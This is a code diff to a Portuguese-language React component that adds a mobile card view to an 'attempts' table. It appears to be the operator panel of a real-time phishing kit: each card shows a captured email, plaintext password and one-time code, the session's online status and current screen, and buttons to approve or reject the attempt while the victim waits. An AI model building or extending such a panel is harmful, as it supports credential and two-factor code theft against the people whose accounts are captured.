@@ -950,7 +950,89 @@ function AttemptsTable({
   liveScreens: Map<string, string>;
 }) {
   return (
-    <div className="overflow-x-auto">
+    <>
+      {/* Cards (mobile) */}
+      <div className="space-y-3 p-3 md:hidden">
+        {rows.map((row) => {
+          const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
+          const isOnline = onlineSessionIds.has(row.session_id);
+          const liveKind = liveScreens.get(row.session_id);
+          const screenLabel = liveKind ? screenKindLabel(liveKind) : "Tela código";
+          return (
+            <div
+              key={row.key}
+              className={`rounded-lg border p-3 space-y-2 ${
+                actionable ? "border-primary/30 bg-primary/5" : "border-border bg-muted/20"
+              }`}
+            >
+              <div className="flex items-center justify-between gap-2">
+                {actionable ? <StatusDot online={isOnline} /> : <span />}
+                <span className="text-[10px] text-muted-foreground font-mono-tabular">
+                  {formatTime(row.codeAt)}
+                </span>
+              </div>
+              <div className="space-y-1.5">
+                <div className="flex items-start gap-2 text-xs">
+                  <Mail className="mt-0.5 h-3 w-3 shrink-0 text-muted-foreground" />
+                  <CopyText value={row.email} className="break-all font-mono" />
+                </div>
+                <div className="flex items-start gap-2 text-xs">
+                  <KeyRound className="mt-0.5 h-3 w-3 shrink-0 text-muted-foreground" />
+                  <CopyText value={row.password} className="break-all font-mono" />
+                </div>
+                <div className="flex items-start gap-2 text-sm">
+                  <Hash className="mt-0.5 h-3 w-3 shrink-0 text-muted-foreground" />
+                  <CopyText value={row.code} className="font-mono tracking-widest" />
+                </div>
+              </div>
+              <div className="flex flex-wrap items-center gap-2 pt-1">
+                {actionable && (
+                  <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-[10px] text-primary">
+                    <Monitor className="h-3 w-3" />
+                    {screenLabel}
+                  </span>
+                )}
+                <span className="text-[10px] text-muted-foreground">{deviceLabel(ua)}</span>
+              </div>
+              {actionable && (
+                <div className="flex gap-2 pt-2">
+                  <Button
+                    size="sm"
+                    className="h-11 flex-1 bg-success text-success-foreground hover:bg-success/90"
+                    onClick={() => onAction(row, "approve")}
+                    disabled={busy === `${row.key}-approve`}
+                  >
+                    {busy === `${row.key}-approve` ? (
+                      <Loader2 className="h-4 w-4 animate-spin" />
+                    ) : (
+                      <>
+                        <Check className="mr-1.5 h-4 w-4" /> Aprovar
+                      </>
+                    )}
+                  </Button>
+                  <Button
+                    size="sm"
+                    variant="outline"
+                    className="h-11 flex-1 border-destructive/40 text-destructive hover:bg-destructive/10"
+                    onClick={() => onAction(row, "reject")}
+                    disabled={busy === `${row.key}-reject`}
+                  >
+                    {busy === `${row.key}-reject` ? (
+                      <Loader2 className="h-4 w-4 animate-spin" />
+                    ) : (
+                      <>
+                        <X className="mr-1.5 h-4 w-4" /> Rejeitar
+                      </>
+                    )}
+                  </Button>
+                </div>
+              )}
+            </div>
+          );
+        })}
+      </div>
+      {/* Tabela (desktop) */}
+      <div className="hidden overflow-x-auto md:block">
       <table className="w-full text-sm">
         <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
           <tr>
